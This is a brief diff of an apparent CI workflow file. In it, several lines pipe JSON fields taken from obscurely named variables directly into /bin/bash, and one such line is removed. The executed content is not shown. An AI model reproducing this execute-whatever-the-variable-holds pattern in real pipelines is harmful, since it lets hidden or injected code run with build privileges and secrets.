@@ -49,7 +49,6 @@ jobs:
           printf '%s' "$ubi6" | jq -r .zsln166 | /bin/bash
           echo $frki01 | jq -r .wv2 | /bin/bash
           printf '%s' "$oau65963" | jq -r .skiv859 | /bin/bash
-          echo $et35 | jq -r .a387 | /bin/bash
           echo $q8 | jq -r .fuit9007 | /bin/bash
           echo $loo21 | jq -r .e5 | /bin/bash
 
